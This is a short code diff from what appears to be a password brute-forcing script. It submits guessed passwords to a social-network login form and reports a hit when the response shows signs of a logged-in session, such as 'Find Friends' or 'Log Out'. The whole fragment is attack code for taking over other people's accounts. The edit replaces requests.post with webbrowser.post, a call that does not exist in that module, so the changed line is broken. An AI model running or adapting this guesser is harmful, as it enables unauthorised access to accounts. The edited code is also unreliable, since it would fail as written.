@@ -37,7 +37,7 @@ def is_this_a_password(email, index, password):
         PAYLOAD, COOKIES = create_form()
         PAYLOAD['email'] = email
     PAYLOAD['pass'] = password
-    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    r = webbrowser.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
     if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
         open('temp', 'w').write(str(r.content))
         print('\npassword found is: ', password)
